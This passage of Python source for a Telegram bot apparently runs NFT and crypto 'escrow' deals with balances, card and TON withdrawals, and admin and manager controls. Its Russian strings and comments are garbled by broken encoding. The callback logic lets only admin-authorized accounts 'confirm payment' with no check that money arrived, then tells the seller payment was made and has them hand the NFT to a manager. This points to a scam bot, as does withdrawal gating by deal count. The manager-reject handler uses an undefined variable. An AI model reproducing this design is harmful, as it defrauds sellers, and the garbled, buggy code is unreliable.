                logger.info(f"–ê–¥–º–∏–Ω {user_id} —É–¥–∞–ª–∏–ª –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_to_remove} –∏–∑ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã—Ö")
            else:
                await update.message.reply_text("‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ —Å–ø–∏—Å–∫–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã—Ö.")
        except ValueError:
            await update.message.reply_text("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç ID. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ü–µ–ª–æ–µ —á–∏—Å–ª–æ.")
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –≤ remove_user_command: {e}")
        await update.message.reply_text("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è")


async def list_users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.message.from_user.id
        if user_id != ADMIN_ID:
            await update.message.reply_text("‚ùå –≠—Ç–∞ –∫–æ–º–∞–Ω–¥–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É")
            return

        if not authorized_users:
            await update.message.reply_text("üì≠ –°–ø–∏—Å–æ–∫ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –ø—É—Å—Ç.")
            return

        users_list = "üìã –ê–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏:\n\n"
        for idx, auth_user_id in enumerate(authorized_users, 1):
            try:
                user_info = await context.bot.get_chat(auth_user_id)
                username = user_info.username or "–ë–µ–∑ username"
                users_list += f"{idx}. @{username} (ID: {auth_user_id})\n"
            except:
                users_list += f"{idx}. ID: {auth_user_id} (–Ω–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é)\n"

        users_list += f"\n–í—Å–µ–≥–æ: {len(authorized_users)} –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π"
        await update.message.reply_text(users_list)
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –≤ list_users_command: {e}")
        await update.message.reply_text("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å–ø–∏—Å–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π")


async def admin_balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.message.from_user.id
        if user_id != ADMIN_ID:
            await update.message.reply_text("‚ùå –≠—Ç–∞ –∫–æ–º–∞–Ω–¥–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É")
            return

        total_balance = sum(user_balances.values())
        total_users = len(user_balances)
        total_pending_withdrawals = sum(w['amount'] for w in pending_withdrawals.values() if isinstance(w, dict))

        text = (
            f"üí∞ –û–ë–©–ê–Ø –°–¢–ê–¢–ò–°–¢–ò–ö–ê –ë–ê–õ–ê–ù–°–û–í\n\n"
            f"üë• –í—Å–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –±–∞–ª–∞–Ω—Å–æ–º: {total_users}\n"
            f"üíµ –û–±—â–∞—è —Å—É–º–º–∞ –Ω–∞ –±–∞–ª–∞–Ω—Å–∞—Ö: {total_balance:.2f} —Ä—É–±\n"
            f"‚è≥ –û–∂–∏–¥–∞—é—â–∏–µ –≤—ã–≤–æ–¥—ã: {total_pending_withdrawals:.2f} —Ä—É–±\n"
            f"üëë –ö–æ–º–∏—Å—Å–∏—è —Å–∏—Å—Ç–µ–º—ã: {SYSTEM_FEE_PERCENT}%\n"
            f"üí∏ –ú–∏–Ω. –≤—ã–≤–æ–¥: {MIN_WITHDRAWAL_AMOUNT} —Ä—É–±\n"
            f"üìä –¢—Ä–µ–±—É–µ—Ç—Å—è —Å–¥–µ–ª–æ–∫ –¥–ª—è –≤—ã–≤–æ–¥–∞: {MIN_DEALS_FOR_WITHDRAWAL}\n\n"
            f"üìã –¢–û–ü-10 –ü–û –ë–ê–õ–ê–ù–°–£:\n"
        )

        sorted_users = sorted(user_balances.items(), key=lambda x: x[1], reverse=True)[:10]
        for idx, (uid, bal) in enumerate(sorted_users, 1):
            try:
                user_info = await context.bot.get_chat(uid)
                username = user_info.username or f"ID: {uid}"
                text += f"{idx}. @{username}: {bal:.2f} —Ä—É–±\n"
            except:
                text += f"{idx}. ID {uid}: {bal:.2f} —Ä—É–±\n"

        await update.message.reply_text(text)
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –≤ admin_balance_command: {e}")
        await update.message.reply_text("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏ –±–∞–ª–∞–Ω—Å–æ–≤")


# ------------------ –û–ë–†–ê–ë–û–¢–ß–ò–ö –ö–û–õ–ë–≠–ö–û–í ------------------
async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()

        user_id = query.from_user.id
        data = query.data

        if data.startswith("set_lang_"):
            lang = data.replace("set_lang_", "")
            if lang in [LANG_RU, LANG_EN]:
                context.user_data['language'] = lang
                await query.message.edit_text(
                    get_text(user_id, 'language_selected', context),
                    reply_markup=None
                )
                await send_main_menu_with_photo(query.message.chat_id, context)
            return

        if 'language' not in context.user_data:
            await query.message.reply_text(
                get_text(user_id, 'choose_language', context),
                reply_markup=get_language_keyboard()
            )
            return

        if data == "back_to_menu":
            await send_main_menu_with_photo(query.message.chat_id, context)
            return

        if data == "my_balance":
            balance = get_user_balance(user_id)
            username = query.from_user.username or "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å"

            can_wallet, wallet_status, _ = get_withdrawal_status(user_id, 'wallet', context)
            can_card, card_status, _ = get_withdrawal_status(user_id, 'card', context)

            wallet_info = f"ü™ô TON-–∫–æ—à–µ–ª–µ–∫: {wallet_status}"
            card_info = f"üí≥ –ö–∞—Ä—Ç–∞: {card_status}"

            deals = user_deals_count.get(user_id, 0)
            # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Ç—Ä–µ–±–æ–≤–∞–Ω–∏–µ –æ —Å–¥–µ–ª–∫–∞—Ö —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –µ—Å—Ç—å 1 –∏–ª–∏ 2 —Å–¥–µ–ª–∫–∏
            if deals > 0 and deals < MIN_DEALS_FOR_WITHDRAWAL:
                deals_requirement = get_text(user_id, 'deals_requirement', context, min_deals=MIN_DEALS_FOR_WITHDRAWAL)
            else:
                deals_requirement = ""

            text = get_text(user_id, 'my_balance', context,
                            username=username, balance=balance,
                            wallet_info=wallet_info, card_info=card_info,
                            fee=SYSTEM_FEE_PERCENT, min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                            deals_requirement=deals_requirement, deals=deals)
            await query.message.reply_text(text, reply_markup=get_balance_keyboard(user_id, context))
            return

        if data == "withdraw_funds":
            balance = get_user_balance(user_id)
            if balance < MIN_WITHDRAWAL_AMOUNT:
                await query.message.reply_text(
                    get_text(user_id, 'insufficient_balance', context,
                             balance=balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                             need=MIN_WITHDRAWAL_AMOUNT - balance),
                    reply_markup=get_back_keyboard(user_id, context)
                )
                return

            deals = user_deals_count.get(user_id, 0)
            if deals > 0 and deals < MIN_DEALS_FOR_WITHDRAWAL:
                deals_requirement = get_text(user_id, 'deals_requirement', context, min_deals=MIN_DEALS_FOR_WITHDRAWAL)
            else:
                deals_requirement = ""

            await query.message.reply_text(
                get_text(user_id, 'withdraw_funds', context,
                         balance=balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                         deals_requirement=deals_requirement),
                reply_markup=get_withdrawal_keyboard(user_id, context)
            )
            return

        if data == "withdraw_to_card":
            balance = get_user_balance(user_id)
            if balance < MIN_WITHDRAWAL_AMOUNT:
                await query.message.reply_text(
                    get_text(user_id, 'insufficient_balance', context,
                             balance=balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                             need=MIN_WITHDRAWAL_AMOUNT - balance),
                    reply_markup=get_back_keyboard(user_id, context)
                )
                return

            can_withdraw, status_text, needed = get_withdrawal_status(user_id, 'card', context)

            if not can_withdraw:
                if needed > 0:
                    # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º, —Å–∫–æ–ª—å–∫–æ –µ—â—ë –Ω—É–∂–Ω–æ —Å–¥–µ–ª–æ–∫
                    await query.message.reply_text(
                        get_text(user_id, 'withdraw_deficit', context,
                                 needed=needed, balance=balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                                 deals=user_deals_count.get(user_id, 0), min_deals=MIN_DEALS_FOR_WITHDRAWAL),
                        reply_markup=get_back_keyboard(user_id, context)
                    )
                else:
                    # –ï—Å–ª–∏ –Ω–µ—Ç –∫–∞—Ä—Ç—ã
                    await query.message.reply_text(status_text, reply_markup=get_back_keyboard(user_id, context))
                return

            if user_id not in user_cards:
                await query.message.reply_text(
                    get_text(user_id, 'no_card', context),
                    reply_markup=get_back_keyboard(user_id, context)
                )
                return

            card_number = user_cards[user_id]
            context.user_data['withdraw_method'] = 'card'
            context.user_data['withdraw_details'] = card_number
            context.user_data['waiting_for_withdraw_amount'] = True
            await query.message.reply_text(
                get_text(user_id, 'withdraw_to_card', context,
                         card=card_number, status_text=status_text,
                         balance=balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT),
                reply_markup=get_back_keyboard(user_id, context),
                parse_mode='HTML'
            )
            return

        if data == "withdraw_to_wallet":
            balance = get_user_balance(user_id)
            if balance < MIN_WITHDRAWAL_AMOUNT:
                await query.message.reply_text(
                    get_text(user_id, 'insufficient_balance', context,
                             balance=balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                             need=MIN_WITHDRAWAL_AMOUNT - balance),
                    reply_markup=get_back_keyboard(user_id, context)
                )
                return

            can_withdraw, status_text, needed = get_withdrawal_status(user_id, 'wallet', context)

            if not can_withdraw:
                if needed > 0:
                    await query.message.reply_text(
                        get_text(user_id, 'withdraw_deficit', context,
                                 needed=needed, balance=balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                                 deals=user_deals_count.get(user_id, 0), min_deals=MIN_DEALS_FOR_WITHDRAWAL),
                        reply_markup=get_back_keyboard(user_id, context)
                    )
                else:
                    await query.message.reply_text(status_text, reply_markup=get_back_keyboard(user_id, context))
                return

            if user_id not in user_wallets:
                await query.message.reply_text(
                    get_text(user_id, 'no_wallet', context),
                    reply_markup=get_back_keyboard(user_id, context)
                )
                return

            wallet_address = user_wallets[user_id]
            context.user_data['withdraw_method'] = 'TON'
            context.user_data['withdraw_details'] = wallet_address
            context.user_data['waiting_for_withdraw_amount'] = True
            await query.message.reply_text(
                get_text(user_id, 'withdraw_to_wallet', context,
                         wallet=wallet_address, status_text=status_text,
                         balance=balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT),
                reply_markup=get_back_keyboard(user_id, context),
                parse_mode='HTML'
            )
            return

        if data == "transaction_history":
            await query.message.reply_text(
                get_text(user_id, 'transaction_history', context),
                reply_markup=get_balance_keyboard(user_id, context)
            )
            return

        if data == "manage_requisites":
            await query.message.reply_text(
                get_text(user_id, 'manage_requisites', context),
                reply_markup=get_requisites_keyboard(user_id, context)
            )
            return

        if data == "create_deal":
            await query.message.reply_text(
                get_text(user_id, 'create_deal_prompt', context),
                reply_markup=get_deal_keyboard(user_id, context)
            )
            return

        if data in ["deal_ton", "deal_card", "deal_stars"]:
            if data == "deal_ton":
                currency = CURRENCY_TON
            elif data == "deal_card":
                currency = CURRENCY_RUB
                if user_id not in user_cards:
                    await query.message.reply_text(
                        get_text(user_id, 'no_card', context),
                        reply_markup=get_back_keyboard(user_id, context)
                    )
                    return
            else:
                currency = CURRENCY_STARS
            context.user_data['deal_currency'] = currency
            unit = CURRENCY_UNITS.get(currency, "TON")
            await query.message.reply_text(
                get_text(user_id, 'enter_amount', context, unit=unit),
                reply_markup=get_back_keyboard(user_id, context)
            )
            context.user_data['creating_deal'] = True
            context.user_data['deal_stage'] = 'amount'
            return

        if data == "add_wallet":
            current_wallet = user_wallets.get(user_id)
            if current_wallet:
                can_withdraw, status_text, needed = get_withdrawal_status(user_id, 'wallet', context)
                await query.message.reply_text(
                    get_text(user_id, 'add_wallet_change', context,
                             wallet=current_wallet, status=status_text,
                             min_withdraw=MIN_WITHDRAWAL_AMOUNT),
                    reply_markup=get_back_keyboard(user_id, context),
                    parse_mode='HTML'
                )
            else:
                await query.message.reply_text(
                    get_text(user_id, 'add_wallet_prompt', context,
                             min_withdraw=MIN_WITHDRAWAL_AMOUNT),
                    reply_markup=get_back_keyboard(user_id, context),
                    parse_mode='HTML'
                )
            context.user_data['waiting_for_wallet'] = True
            context.user_data['waiting_for_card'] = False
            return

        if data == "add_card":
            current_card = user_cards.get(user_id)
            if current_card:
                can_withdraw, status_text, needed = get_withdrawal_status(user_id, 'card', context)
                await query.message.reply_text(
                    get_text(user_id, 'add_card_change', context,
                             card=current_card, status=status_text,
                             min_withdraw=MIN_WITHDRAWAL_AMOUNT),
                    reply_markup=get_back_keyboard(user_id, context),
                    parse_mode='HTML'
                )
            else:
                await query.message.reply_text(
                    get_text(user_id, 'add_card_prompt', context,
                             min_withdraw=MIN_WITHDRAWAL_AMOUNT),
                    reply_markup=get_back_keyboard(user_id, context),
                    parse_mode='HTML'
                )
            context.user_data['waiting_for_card'] = True
            context.user_data['waiting_for_wallet'] = False
            return

        if data == "referral_system":
            await query.message.reply_text(
                get_text(user_id, 'referral_system', context),
                reply_markup=get_back_keyboard(user_id, context)
            )
            return

        if data == "support":
            await query.message.reply_text(
                get_text(user_id, 'support_message', context),
                reply_markup=get_support_keyboard(user_id, context)
            )
            return

        if data.startswith("confirm_payment_"):
            deal_id = data.replace("confirm_payment_", "")
            if deal_id not in deal_links:
                await query.message.reply_text(get_text(user_id, 'deal_not_found', context))
                return
            if user_id not in active_buyers or active_buyers[user_id] != deal_id:
                await query.message.reply_text(
                    get_text(user_id, 'not_buyer', context),
                    reply_markup=get_main_keyboard(user_id, context)
                )
                return
            is_authorized = is_authorized_user(user_id)
            if not is_authorized:
                deal_data = deal_links[deal_id]
                currency = deal_data.get('currency', CURRENCY_TON)
                currency_unit = CURRENCY_UNITS.get(currency, "TON")
                await query.message.reply_text(
                    get_text(user_id, 'payment_confirmed_unauthorized', context,
                             amount=deal_data['amount'], unit=currency_unit,
                             description=deal_data['description'], deal_id=deal_id),
                    reply_markup=get_back_keyboard(user_id, context)
                )
                logger.info(
                    f"‚è≥ –ù–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} –Ω–∞–∂–∞–ª –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –æ–ø–ª–∞—Ç—ã –¥–ª—è —Å–¥–µ–ª–∫–∏ {deal_id}")
                return
            buyer_username = query.from_user.username or "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å"
            seller_notified = await notify_seller_about_payment(deal_id, buyer_username, user_id, context)
            buyer_notified = await notify_buyer_about_payment_confirmation(deal_id, user_id, context)
            active_buyers.pop(user_id, None)
            if seller_notified and buyer_notified:
                current_deals = user_deals_count.get(user_id, 0)
                await query.message.reply_text(
                    get_text(user_id, 'payment_confirmed_authorized', context, deals=current_deals),
                    reply_markup=get_main_keyboard(user_id, context)
                )
            else:
                await query.message.reply_text(
                    get_text(user_id, 'payment_confirmation_error', context),
                    reply_markup=get_main_keyboard(user_id, context)
                )
            return

        if data == "exit_deal":
            active_buyers.pop(user_id, None)
            await send_main_menu_with_photo(query.message.chat_id, context)
            return

        if data.startswith("request_transfer_"):
            deal_id = data.replace("request_transfer_", "")
            if deal_id not in deal_links or deal_id not in seller_transfers:
                await query.message.reply_text(get_text(user_id, 'deal_not_found', context))
                return
            deal_data = deal_links[deal_id]
            if user_id != deal_data['user_id']:
                await query.message.reply_text(get_text(user_id, 'not_seller', context))
                return
            if seller_transfers[deal_id]['transfer_requested']:
                await query.message.reply_text("‚ùå –ó–∞—è–≤–∫–∞ –Ω–∞ –ø–µ—Ä–µ–¥–∞—á—É —É–∂–µ –ø–æ–¥–∞–Ω–∞. –û–∂–∏–¥–∞–π—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –º–µ–Ω–µ–¥–∂–µ—Ä–∞.")
                return
            seller_transfers[deal_id]['transfer_requested'] = True
            seller_transfers[deal_id]['seller_confirmed'] = True
            seller_username = query.from_user.username or deal_data.get('username', '–ü—Ä–æ–¥–∞–≤–µ—Ü')
            managers_notified = await notify_managers_about_transfer_request(deal_id, seller_username, context)
            net_amount = seller_transfers[deal_id]['net_amount']
            if managers_notified:
                await query.message.reply_text(
                    get_text(user_id, 'transfer_request_submitted', context,
                             deal_id=deal_id, description=deal_data['description'], net=net_amount),
                    reply_markup=get_back_keyboard(user_id, context)
                )
                logger.info(f"‚úÖ –ü—Ä–æ–¥–∞–≤–µ—Ü {user_id} –ø–æ–¥–∞–ª –∑–∞—è–≤–∫—É –Ω–∞ –ø–µ—Ä–µ–¥–∞—á—É NFT –¥–ª—è —Å–¥–µ–ª–∫–∏ {deal_id}")
            else:
                await query.message.reply_text(
                    get_text(user_id, 'transfer_request_error', context),
                    reply_markup=get_main_keyboard(user_id, context)
                )
            return

        if data.startswith("manager_confirm_"):
            deal_id = data.replace("manager_confirm_", "")
            if not is_manager(user_id):
                await query.message.reply_text("‚ùå –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –º–µ–Ω–µ–¥–∂–µ—Ä–∞–º")
                return
            if deal_id not in deal_links or deal_id not in seller_transfers:
                await query.message.reply_text(get_text(user_id, 'deal_not_found', context))
                return
            if not seller_transfers[deal_id]['transfer_requested']:
                await query.message.reply_text("‚ùå –ü—Ä–æ–¥–∞–≤–µ—Ü –µ—â–µ –Ω–µ –ø–æ–¥–∞–ª –∑–∞—è–≤–∫—É –Ω–∞ –ø–µ—Ä–µ–¥–∞—á—É NFT")
                return
            if seller_transfers[deal_id]['manager_confirmed']:
                await query.message.reply_text("‚ùå –ü–µ—Ä–µ–¥–∞—á–∞ —É–∂–µ –±—ã–ª–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∞ –º–µ–Ω–µ–¥–∂–µ—Ä–æ–º —Ä–∞–Ω–µ–µ")
                return
            seller_transfers[deal_id]['manager_confirmed'] = True
            buyer_notified = await notify_buyer_about_transfer_confirmation(deal_id, context)
            seller_notified = await notify_seller_about_manager_confirmation(deal_id, context)
            admin_notified = await notify_admin_about_completed_deal(deal_id, context)
            net_amount = seller_transfers[deal_id]['net_amount']
            if buyer_notified and seller_notified:
                await query.message.reply_text(
                    get_text(user_id, 'manager_confirmed', context, net=net_amount),
                    reply_markup=get_back_keyboard(user_id, context)
                )
                logger.info(f"‚úÖ –ú–µ–Ω–µ–¥–∂–µ—Ä {user_id} –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª –ø–æ–ª—É—á–µ–Ω–∏–µ NFT –¥–ª—è —Å–¥–µ–ª–∫–∏ {deal_id}")
            else:
                await query.message.reply_text(
                    get_text(user_id, 'manager_action_error', context),
                    reply_markup=get_main_keyboard(user_id, context)
                )
            return

        if data.startswith("manager_reject_"):
            deal_id = data.replace("manager_reject_", "")
            if not is_manager(user_id):
                await query.message.reply_text("‚ùå –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –º–µ–Ω–µ–¥–∂–µ—Ä–∞–º")
                return
            if deal_id not in deal_links or deal_id not in seller_transfers:
                await query.message.reply_text(get_text(user_id, 'deal_not_found', context))
                return
            seller_transfers[deal_id]['transfer_requested'] = False
            seller_transfers[deal_id]['seller_confirmed'] = False
            seller_notified = await notify_seller_about_manager_rejection(deal_id, context)
            if seller_notified:
                await query.message.reply_text(
                    get_text(user_id, 'manager_confirmed', context, deal_id=deal_id, net=net_amount),
                    reply_markup=get_back_keyboard(user_id, context)
                )
                logger.info(f"‚ùå –ú–µ–Ω–µ–¥–∂–µ—Ä {user_id} –æ—Ç–∫–ª–æ–Ω–∏–ª –∑–∞—è–≤–∫—É –Ω–∞ –ø–µ—Ä–µ–¥–∞—á—É NFT –¥–ª—è —Å–¥–µ–ª–∫–∏ {deal_id}")
            else:
                await query.message.reply_text(
                    get_text(user_id, 'manager_action_error', context),
                    reply_markup=get_main_keyboard(user_id, context)
                )
            return

        if data.startswith("cancel_deal_"):
            deal_id = data.replace("cancel_deal_", "")
            if deal_id not in deal_links:
                await query.message.reply_text(get_text(user_id, 'deal_not_found', context))
                return
            deal_data = deal_links[deal_id]
            if user_id != deal_data['user_id']:
                await query.message.reply_text(get_text(user_id, 'not_seller', context))
                return
            if deal_id in deal_links:
                del deal_links[deal_id]
            if deal_id in seller_transfers:
                del seller_transfers[deal_id]
            for buyer_id, active_deal_id in list(active_buyers.items()):
                if active_deal_id == deal_id:
                    del active_buyers[buyer_id]
                    try:
                        await context.bot.send_message(
                            chat_id=buyer_id,
                            text=get_text(buyer_id, 'buyer_deal_cancelled', context, deal_id=deal_id),
                            reply_markup=get_main_keyboard(buyer_id, context)
                        )
                    except:
                        pass
            await query.message.reply_text(
                get_text(user_id, 'deal_cancelled', context, deal_id=deal_id),
                reply_markup=get_main_keyboard(user_id, context)
            )
            logger.info(f"‚ùå –°–¥–µ–ª–∫–∞ {deal_id} –æ—Ç–º–µ–Ω–µ–Ω–∞ –ø—Ä–æ–¥–∞–≤—Ü–æ–º {user_id}")
            return

    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –≤ handle_callback_query: {e}")
        try:
            await update.callback_query.message.reply_text("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.")
        except:
            pass


# ------------------ –û–ë–†–ê–ë–û–¢–ß–ò–ö –°–û–û–ë–©–ï–ù–ò–ô ------------------
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not update.message:
            return
        text = update.message.text
        user_id = update.message.from_user.id

        if 'language' not in context.user_data:
            await update.message.reply_text(
                get_text(user_id, 'choose_language', context),
                reply_markup=get_language_keyboard()
            )
            return

        if context.user_data.get('creating_deal'):
            deal_stage = context.user_data.get('deal_stage')
            if deal_stage == 'amount':
                try:
                    amount = float(text)
                    if amount <= 0:
                        raise ValueError("Negative amount")
                    context.user_data['deal_amount'] = amount
                    context.user_data['deal_stage'] = 'description'
                    currency = context.user_data.get('deal_currency', CURRENCY_TON)
                    currency_unit = CURRENCY_UNITS.get(currency, "TON")
                    await update.message.reply_text(
                        get_text(user_id, 'enter_description', context,
                                 amount=amount, unit=currency_unit),
                        reply_markup=get_back_keyboard(user_id, context)
                    )
                except ValueError:
                    currency = context.user_data.get('deal_currency', CURRENCY_TON)
                    currency_unit = CURRENCY_UNITS.get(currency, "TON")
                    await update.message.reply_text(
                        get_text(user_id, 'invalid_amount', context, unit=currency_unit),
                        reply_markup=get_back_keyboard(user_id, context)
                    )
            elif deal_stage == 'description':
                description = text.strip()
                context.user_data['deal_description'] = description
                deal_id = generate_deal_id()
                currency = context.user_data.get('deal_currency', CURRENCY_TON)
                deal_data = {
                    'user_id': user_id,
                    'amount': context.user_data['deal_amount'],
                    'description': description,
                    'wallet': user_wallets.get(user_id, '–ù–µ —É–∫–∞–∑–∞–Ω'),
                    'card': user_cards.get(user_id, '–ù–µ —É–∫–∞–∑–∞–Ω'),
                    'username': update.message.from_user.username or '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å',
                    'currency': currency
                }
                deal_links[deal_id] = deal_data
                currency_unit = CURRENCY_UNITS.get(currency, "TON")
                bot_username = context.bot.username
                deal_link = f"https://t.me/{bot_username}?start={deal_id}"
                await update.message.reply_text(
                    get_text(user_id, 'deal_created', context,
                             amount=context.user_data['deal_amount'],
                             unit=currency_unit, currency=currency,
                             description=description, link=deal_link),
                    reply_markup=get_back_keyboard(user_id, context)
                )
                for key in ['creating_deal', 'deal_stage', 'deal_amount', 'deal_description', 'deal_currency']:
                    context.user_data.pop(key, None)

        elif context.user_data.get('waiting_for_withdraw_amount'):
            try:
                amount = float(text)
                if amount < MIN_WITHDRAWAL_AMOUNT:
                    await update.message.reply_text(
                        get_text(user_id, 'insufficient_balance', context,
                                 balance=get_user_balance(user_id),
                                 min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                                 need=MIN_WITHDRAWAL_AMOUNT - amount),
                        reply_markup=get_back_keyboard(user_id, context)
                    )
                    return
                balance = get_user_balance(user_id)
                if amount > balance:
                    await update.message.reply_text(
                        get_text(user_id, 'insufficient_balance', context,
                                 balance=balance,
                                 min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                                 need=amount - balance),
                        reply_markup=get_back_keyboard(user_id, context)
                    )
                    return
                method = context.user_data.get('withdraw_method', '–ù–µ —É–∫–∞–∑–∞–Ω')
                details = context.user_data.get('withdraw_details', '–ù–µ —É–∫–∞–∑–∞–Ω—ã')

                # –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –≤—ã–≤–æ–¥–∞ (–Ω–∞ —Å–ª—É—á–∞–π –µ—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∏–∑–º–µ–Ω–∏–ª —Ä–µ–∫–≤–∏–∑–∏—Ç—ã –ø–æ—Å–ª–µ –Ω–∞—á–∞–ª–∞ –æ–ø–µ—Ä–∞—Ü–∏–∏)
                if method == 'card':
                    can_withdraw, _, needed = get_withdrawal_status(user_id, 'card', context)
                    if not can_withdraw:
                        await update.message.reply_text(
                            get_text(user_id, 'withdraw_deficit', context,
                                     needed=needed, balance=balance,
                                     min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                                     deals=user_deals_count.get(user_id, 0),
                                     min_deals=MIN_DEALS_FOR_WITHDRAWAL),
                            reply_markup=get_back_keyboard(user_id, context)
                        )
                        return
                elif method == 'TON':
                    can_withdraw, _, needed = get_withdrawal_status(user_id, 'wallet', context)
                    if not can_withdraw:
                        await update.message.reply_text(
                            get_text(user_id, 'withdraw_deficit', context,
                                     needed=needed, balance=balance,
                                     min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                                     deals=user_deals_count.get(user_id, 0),
                                     min_deals=MIN_DEALS_FOR_WITHDRAWAL),
                            reply_markup=get_back_keyboard(user_id, context)
                        )
                        return
                else:
                    # –ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –º–µ—Ç–æ–¥
                    await update.message.reply_text(
                        "‚ùå –ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –º–µ—Ç–æ–¥ –≤—ã–≤–æ–¥–∞",
                        reply_markup=get_back_keyboard(user_id, context)
                    )
                    return

                success = await process_withdrawal(user_id, amount, method, details, context)
                context.user_data.pop('waiting_for_withdraw_amount', None)
                context.user_data.pop('withdraw_method', None)
                context.user_data.pop('withdraw_details', None)
                if not success:
                    await update.message.reply_text(
                        get_text(user_id, 'withdraw_error', context),
                        reply_markup=get_main_keyboard(user_id, context)
                    )
            except ValueError:
                await update.message.reply_text(
                    "‚ùå **–ù–ï–í–ï–†–ù–´–ô –§–û–†–ú–ê–¢ –°–£–ú–ú–´!**\n\n"
                    "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –≤ —Ñ–æ—Ä–º–∞—Ç–µ: 1000.50",
                    reply_markup=get_back_keyboard(user_id, context)
                )

        elif context.user_data.get('waiting_for_wallet'):
            wallet_address = text.strip()
            if len(wallet_address) < 10:
                await update.message.reply_text(
                    get_text(user_id, 'invalid_wallet', context),
                    reply_markup=get_back_keyboard(user_id, context)
                )
                return
            user_wallets[user_id] = wallet_address
            context.user_data['waiting_for_wallet'] = False
            deals = user_deals_count.get(user_id, 0)
            await update.message.reply_text(
                get_text(user_id, 'wallet_saved', context,
                         wallet=wallet_address,
                         min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                         fee=SYSTEM_FEE_PERCENT,
                         deals=deals),
                reply_markup=get_back_keyboard(user_id, context),
                parse_mode='HTML'
            )

        elif context.user_data.get('waiting_for_card'):
